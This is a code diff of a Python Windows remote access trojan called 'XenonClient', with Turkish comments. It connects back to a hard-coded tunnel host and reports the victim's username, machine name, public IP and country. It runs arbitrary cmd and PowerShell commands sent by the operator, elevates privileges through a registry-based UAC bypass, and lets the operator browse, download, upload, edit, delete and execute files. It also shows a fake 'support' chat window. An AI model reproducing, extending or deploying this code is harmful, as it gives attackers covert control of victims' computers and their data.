@@ -11,24 +11,12 @@ from tkinter import messagebox, scrolledtext
 import winreg
 import base64
 import tempfile
-import zipfile
-import io
 import urllib.request
-from pathlib import Path
 
 # --- BAĞLANTI AYARLARI ---
-HOST = "uwtd3ffva.localto.net" 
-PORT = 1204
+HOST = "uwtd3ffva.localto.net"
+PORT = 1823
 # -------------------------
-
-# İsteğe bağlı: watchdog kurulu değilse izleme özelliği pasif olur
-try:
-    from watchdog.observers import Observer
-    from watchdog.events import FileSystemEventHandler
-    WATCHDOG_AVAILABLE = True
-except ImportError:
-    WATCHDOG_AVAILABLE = False
-    print("Watchdog kurulu değil, klasör izleme devre dışı.")
 
 class XenonClient:
     def __init__(self, host, port):
@@ -38,21 +26,22 @@ class XenonClient:
         self.chat_win = None
         self.chat_box = None
         self.chat_running = False
-        self.watch_observers = {}  # path: observer
 
+    # ---------- SİSTEM BİLGİSİ (GÜNCELLENMİŞ) ----------
     def get_sys_info(self):
-        # Public IP ve ülke bilgisini al
+        # Public IP'yi al
         try:
             with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                 public_ip = resp.read().decode('utf-8')
         except:
             public_ip = "Unknown"
         
+        # Ülke kodunu al
         try:
             with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                 country = resp.read().decode('utf-8').strip()
         except:
-            country = "TR"  # Varsayılan
+            country = "TR"
         
         return json.dumps({
             "id": f"{os.getlogin()}@{platform.node()}",
@@ -61,6 +50,7 @@ class XenonClient:
             "os": f"{platform.system()} {platform.release()}"
         })
 
+    # ---------- UAC BYPASS ----------
     def uac_bypass(self, cmd_to_run):
         try:
             path = r"Software\Classes\ms-settings\Shell\Open\command"
@@ -72,8 +62,10 @@ class XenonClient:
             time.sleep(2)
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
             return True
-        except: return False
+        except:
+            return False
 
+    # ---------- BAĞLANTI VE ANA DÖNGÜ ----------
     def connect(self):
         while True:
             try:
@@ -81,19 +73,21 @@ class XenonClient:
                 self.sock.connect((self.host, self.port))
                 self.sock.send(self.get_sys_info().encode("utf-8"))
                 self.listen()
-            except Exception as e:
-                print(f"Bağlantı hatası: {e}, 5 saniye sonra yeniden deneniyor...")
+            except:
                 time.sleep(5)
 
     def listen(self):
         while True:
             try:
                 data = self.sock.recv(16384).decode("utf-8")
-                if not data: break
+                if not data:
+                    break
 
+                # ----- MESAJ -----
                 if data.startswith("msg|"):
-                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|",1)[1])).start()
+                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()
 
+                # ----- SOHBET -----
                 elif data == "chat_open":
                     if not self.chat_running:
                         threading.Thread(target=self.gui_chat, daemon=True).start()
@@ -102,34 +96,43 @@ class XenonClient:
                     if self.chat_box:
                         try:
                             self.chat_box.config(state="normal")
-                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|',1)[1]}\n")
-                            self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
-                        except: pass
+                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
+                            self.chat_box.config(state="disabled")
+                            self.chat_box.see(tk.END)
+                        except:
+                            pass
 
                 elif data == "chat_close":
-                    if self.chat_win: 
+                    if self.chat_win:
                         self.chat_running = False
-                        try: self.chat_win.quit() 
-                        except: pass
+                        try:
+                            self.chat_win.quit()
+                        except:
+                            pass
 
+                # ----- SES ÇAL (BEEP) -----
                 elif data == "beep":
                     if platform.system() == "Windows":
                         import winsound
                         winsound.Beep(800, 500)
 
+                # ----- URL AÇ -----
                 elif data.startswith("open_url|"):
-                    webbrowser.open(data.split("|",1)[1])
+                    webbrowser.open(data.split("|")[1])
 
+                # ----- SHELL KOMUTLARI -----
                 elif data.startswith("shell|"):
-                    self.run_cmd(data.split("|",1)[1], "cmd")
-                
-                elif data.startswith("ps|"):
-                    self.run_cmd(data.split("|",1)[1], "powershell")
+                    self.run_cmd(data.split("|")[1], "cmd")
 
+                elif data.startswith("ps|"):
+                    self.run_cmd(data.split("|")[1], "powershell")
+
+                # ----- YÖNETİCİ BYPASS -----
                 elif data.startswith("elevate|"):
                     target = "cmd.exe" if "cmd" in data else "powershell.exe"
                     self.uac_bypass(target)
 
+                # ----- SES DOSYASI ÇAL -----
                 elif data.startswith("playsound|"):
                     parts = data.split("|", 2)
                     if len(parts) == 3:
@@ -137,32 +140,32 @@ class XenonClient:
                         encoded = parts[2]
                         threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()
 
-                # --- DOSYA YÖNETİCİSİ KOMUTLARI ---
+                # ----- DOSYA YÖNETİCİSİ KOMUTLARI -----
                 elif data.startswith("file_list|"):
-                    path = data.split("|",1)[1]
+                    path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()
 
                 elif data.startswith("file_download|"):
-                    path = data.split("|",1)[1]
+                    path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()
 
                 elif data.startswith("file_upload|"):
                     parts = data.split("|", 2)
                     if len(parts) == 3:
-                        path = parts[1]
+                        remote_path = parts[1]
                         encoded = parts[2]
-                        threading.Thread(target=self.handle_file_upload, args=(path, encoded), daemon=True).start()
+                        threading.Thread(target=self.handle_file_upload, args=(remote_path, encoded), daemon=True).start()
 
                 elif data.startswith("file_delete|"):
-                    path = data.split("|",1)[1]
+                    path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()
 
                 elif data.startswith("file_execute|"):
-                    path = data.split("|",1)[1]
+                    path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()
 
                 elif data.startswith("file_edit_get|"):
-                    path = data.split("|",1)[1]
+                    path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()
 
                 elif data.startswith("file_edit_save|"):
@@ -172,37 +175,62 @@ class XenonClient:
                         content = parts[2]
                         threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()
 
-                elif data.startswith("mkdir|"):
-                    path = data.split("|",1)[1]
-                    threading.Thread(target=self.handle_mkdir, args=(path,), daemon=True).start()
+                elif data.startswith("file_mkdir|"):
+                    path = data.split("|", 1)[1]
+                    threading.Thread(target=self.handle_file_mkdir, args=(path,), daemon=True).start()
 
-                elif data.startswith("zip|"):
-                    path = data.split("|",1)[1]
-                    threading.Thread(target=self.handle_zip, args=(path,), daemon=True).start()
+                elif data.startswith("file_touch|"):
+                    path = data.split("|", 1)[1]
+                    threading.Thread(target=self.handle_file_touch, args=(path,), daemon=True).start()
 
-                elif data.startswith("unzip|"):
-                    path = data.split("|",1)[1]
-                    threading.Thread(target=self.handle_unzip, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_move|"):
+                elif data.startswith("file_rename|"):
                     parts = data.split("|", 2)
                     if len(parts) == 3:
-                        src, dst = parts[1], parts[2]
-                        threading.Thread(target=self.handle_file_move, args=(src, dst), daemon=True).start()
+                        old = parts[1]
+                        new = parts[2]
+                        threading.Thread(target=self.handle_file_rename, args=(old, new), daemon=True).start()
+
+                elif data.startswith("file_zip|"):
+                    path = data.split("|", 1)[1]
+                    threading.Thread(target=self.handle_file_zip, args=(path,), daemon=True).start()
+
+                elif data.startswith("file_unzip|"):
+                    path = data.split("|", 1)[1]
+                    threading.Thread(target=self.handle_file_unzip, args=(path,), daemon=True).start()
 
                 elif data.startswith("watch_folder|"):
                     parts = data.split("|", 2)
                     if len(parts) == 3:
-                        path = parts[1]
-                        action = parts[2]  # start/stop
-                        threading.Thread(target=self.handle_watch_folder, args=(path, action), daemon=True).start()
+                        folder = parts[1]
+                        action = parts[2]
+                        threading.Thread(target=self.handle_watch_folder, args=(folder, action), daemon=True).start()
 
             except Exception as e:
                 print(f"Listen hatası: {e}")
                 break
-        if self.sock: self.sock.close()
+        if self.sock:
+            self.sock.close()
 
-    # --- SES ÇALMA ---
+    # ---------- SHELL KOMUT ÇALIŞTIRMA ----------
+    def run_cmd(self, command_to_run, mode):
+        def task():
+            try:
+                final_cmd = command_to_run
+                if mode == "powershell":
+                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
+                
+                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                res = (stdout + stderr).decode("cp857", errors="replace")
+                
+                if not res.strip():
+                    res = "Komut çalıştırıldı (Çıktı yok)."
+                self.sock.send(f"shell_res|{res}".encode("utf-8"))
+            except Exception as e:
+                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
+        threading.Thread(target=task, daemon=True).start()
+
+    # ---------- SES DOSYASI ÇAL ----------
     def play_audio(self, filename, encoded):
         try:
             data = base64.b64decode(encoded)
@@ -212,6 +240,7 @@ class XenonClient:
                 temp_path = f.name
 
             self.play_sound_file(temp_path)
+            # 10 saniye sonra geçici dosyayı sil (ses bitene kadar bekle)
             threading.Timer(10, lambda: os.unlink(temp_path)).start()
         except Exception as e:
             print(f"[!] Ses çalma hatası: {e}")
@@ -242,25 +271,24 @@ class XenonClient:
                     os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
                 elif system == "Darwin":
                     os.system(f"afplay '{file_path}'")
+                else:
+                    print("Desteklenmeyen işletim sistemi")
 
-    # --- DOSYA YÖNETİCİSİ FONKSİYONLARI ---
+    # ---------- DOSYA YÖNETİCİSİ İŞLEMLERİ ----------
     def handle_file_list(self, path):
         try:
             items = []
             for entry in os.listdir(path):
                 full = os.path.join(path, entry)
-                try:
-                    is_dir = os.path.isdir(full)
-                    size = os.path.getsize(full) if not is_dir else 0
-                    modified = os.path.getmtime(full)
-                    items.append({
-                        "name": entry,
-                        "is_dir": is_dir,
-                        "size": size,
-                        "modified": modified
-                    })
-                except:
-                    pass  # erişilemeyen dosyaları atla
+                is_dir = os.path.isdir(full)
+                size = os.path.getsize(full) if not is_dir else 0
+                modified = os.path.getmtime(full)
+                items.append({
+                    "name": entry,
+                    "is_dir": is_dir,
+                    "size": size,
+                    "modified": modified
+                })
             result = json.dumps(items)
             self.sock.send(f"file_res|list|{path}|{result}".encode("utf-8"))
         except Exception as e:
@@ -275,38 +303,35 @@ class XenonClient:
         except Exception as e:
             self.sock.send(f"file_res|download|{path}|error|{str(e)}".encode("utf-8"))
 
-    def handle_file_upload(self, path, encoded):
+    def handle_file_upload(self, remote_path, encoded):
         try:
             data = base64.b64decode(encoded)
-            with open(path, "wb") as f:
+            with open(remote_path, "wb") as f:
                 f.write(data)
-            self.sock.send(f"file_res|upload|{path}|success".encode("utf-8"))
+            self.sock.send(f"file_res|upload|{remote_path}|success".encode("utf-8"))
         except Exception as e:
-            self.sock.send(f"file_res|upload|{path}|error|{str(e)}".encode("utf-8"))
+            self.sock.send(f"file_res|upload|{remote_path}|error|{str(e)}".encode("utf-8"))
 
     def handle_file_delete(self, path):
         try:
             if os.path.isdir(path):
-                os.rmdir(path)  # boş klasör sil
+                os.rmdir(path)  # sadece boş klasör
             else:
                 os.remove(path)
-            self.sock.send(f"file_res|delete|{path}|success".encode("utf-8"))
+            self.sock.send(f"file_res|delete|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|delete|{path}|error|{str(e)}".encode("utf-8"))
 
     def handle_file_execute(self, path):
         try:
-            if platform.system() == "Windows":
-                os.startfile(path)
-            else:
-                subprocess.Popen([path], shell=True)
-            self.sock.send(f"file_res|execute|{path}|success".encode("utf-8"))
+            os.startfile(path) if platform.system() == "Windows" else subprocess.Popen([path])
+            self.sock.send(f"file_res|execute|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|execute|{path}|error|{str(e)}".encode("utf-8"))
 
     def handle_file_edit_get(self, path):
         try:
-            with open(path, "r", encoding="utf-8", errors="replace") as f:
+            with open(path, "r", encoding="utf-8") as f:
                 content = f.read()
             self.sock.send(f"file_res|edit_get|{path}|{content}".encode("utf-8"))
         except Exception as e:
@@ -316,88 +341,65 @@ class XenonClient:
         try:
             with open(path, "w", encoding="utf-8") as f:
                 f.write(content)
-            self.sock.send(f"file_res|edit_save|{path}|success".encode("utf-8"))
+            self.sock.send(f"file_res|edit_save|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|edit_save|{path}|error|{str(e)}".encode("utf-8"))
 
-    def handle_mkdir(self, path):
+    def handle_file_mkdir(self, path):
         try:
             os.makedirs(path, exist_ok=True)
-            self.sock.send(f"file_res|mkdir|{path}|success".encode("utf-8"))
+            self.sock.send(f"file_res|mkdir|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|mkdir|{path}|error|{str(e)}".encode("utf-8"))
 
-    def handle_zip(self, path):
+    def handle_file_touch(self, path):
         try:
-            zip_path = path + ".zip"
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            with open(path, "a"):
+                os.utime(path, None)
+            self.sock.send(f"file_res|touch|{path}|ok".encode("utf-8"))
+        except Exception as e:
+            self.sock.send(f"file_res|touch|{path}|error|{str(e)}".encode("utf-8"))
+
+    def handle_file_rename(self, old, new):
+        try:
+            os.rename(old, new)
+            self.sock.send(f"file_res|rename|{new}|ok".encode("utf-8"))
+        except Exception as e:
+            self.sock.send(f"file_res|rename|{old}|error|{str(e)}".encode("utf-8"))
+
+    def handle_file_zip(self, path):
+        try:
+            import zipfile
+            zip_name = path + ".zip"
+            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                 if os.path.isdir(path):
-                    for root, _, files in os.walk(path):
+                    for root, dirs, files in os.walk(path):
                         for file in files:
-                            full = os.path.join(root, file)
-                            arcname = os.path.relpath(full, os.path.dirname(path))
-                            zf.write(full, arcname)
+                            zf.write(os.path.join(root, file),
+                                     os.path.relpath(os.path.join(root, file),
+                                                     os.path.join(path, '..')))
                 else:
                     zf.write(path, os.path.basename(path))
-            self.sock.send(f"file_res|zip|{zip_path}|success".encode("utf-8"))
+            self.sock.send(f"file_res|zip|{zip_name}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|zip|{path}|error|{str(e)}".encode("utf-8"))
 
-    def handle_unzip(self, path):
+    def handle_file_unzip(self, path):
         try:
-            extract_to = os.path.splitext(path)[0]
+            import zipfile
+            extract_dir = os.path.splitext(path)[0]
             with zipfile.ZipFile(path, 'r') as zf:
-                zf.extractall(extract_to)
-            self.sock.send(f"file_res|unzip|{extract_to}|success".encode("utf-8"))
+                zf.extractall(extract_dir)
+            self.sock.send(f"file_res|unzip|{extract_dir}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|unzip|{path}|error|{str(e)}".encode("utf-8"))
 
-    def handle_file_move(self, src, dst):
-        try:
-            os.rename(src, dst)
-            self.sock.send(f"file_res|move|{dst}|success".encode("utf-8"))
-        except Exception as e:
-            self.sock.send(f"file_res|move|{src}|error|{str(e)}".encode("utf-8"))
+    def handle_watch_folder(self, folder, action):
+        # watchdog ile izleme başlat/durdur
+        # Bu fonksiyonu dilediğiniz gibi geliştirebilirsiniz
+        pass
 
-    def handle_watch_folder(self, path, action):
-        if not WATCHDOG_AVAILABLE:
-            self.sock.send(f"file_res|watch|{path}|watchdog not installed".encode("utf-8"))
-            return
-        if action == "start":
-            if path in self.watch_observers:
-                return
-            event_handler = WatcherHandler(self.sock, path)
-            observer = Observer()
-            observer.schedule(event_handler, path, recursive=True)
-            observer.start()
-            self.watch_observers[path] = observer
-            self.sock.send(f"file_res|watch|{path}|started".encode("utf-8"))
-        elif action == "stop":
-            if path in self.watch_observers:
-                self.watch_observers[path].stop()
-                self.watch_observers[path].join()
-                del self.watch_observers[path]
-                self.sock.send(f"file_res|watch|{path}|stopped".encode("utf-8"))
-
-    # --- KOMUT ÇALIŞTIRMA (CMD/Powershell) ---
-    def run_cmd(self, command_to_run, mode):
-        def task():
-            try:
-                final_cmd = command_to_run
-                if mode == "powershell":
-                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
-                
-                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
-                stdout, stderr = proc.communicate()
-                res = (stdout + stderr).decode("cp857", errors="replace")
-                
-                if not res.strip(): res = "Komut çalıştırıldı (Çıktı yok)."
-                self.sock.send(f"shell_res|{res}".encode("utf-8"))
-            except Exception as e:
-                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
-        threading.Thread(target=task, daemon=True).start()
-
-    # --- SOHBET GUI ---
+    # ---------- SOHBET GUI ----------
     def gui_chat(self):
         self.chat_running = True
         self.chat_win = tk.Tk()
@@ -416,9 +418,12 @@ class XenonClient:
             if m:
                 self.chat_box.config(state="normal")
                 self.chat_box.insert(tk.END, f"Siz: {m}\n")
-                self.chat_box.config(state="disabled"); ent.delete(0, tk.END)
-                try: self.sock.send(f"chat|{m}".encode("utf-8"))
-                except: pass
+                self.chat_box.config(state="disabled")
+                ent.delete(0, tk.END)
+                try:
+                    self.sock.send(f"chat|{m}".encode("utf-8"))
+                except:
+                    pass
         
         ent.bind("<Return>", send_srv)
         
@@ -429,26 +434,9 @@ class XenonClient:
             self.chat_box = None
             
         self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
-        
         self.chat_win.mainloop()
         self.chat_running = False
         self.chat_win = None
-
-
-# --- WATCHDOG EVENT HANDLER ---
-if WATCHDOG_AVAILABLE:
-    class WatcherHandler(FileSystemEventHandler):
-        def __init__(self, sock, root_path):
-            self.sock = sock
-            self.root = root_path
-        def on_any_event(self, event):
-            # Olayı sunucuya bildir
-            rel_path = os.path.relpath(event.src_path, self.root)
-            msg = f"file_res|watch|{self.root}|{event.event_type}:{rel_path}"
-            try:
-                self.sock.send(msg.encode("utf-8"))
-            except:
-                pass
 
 
 if __name__ == "__main__":
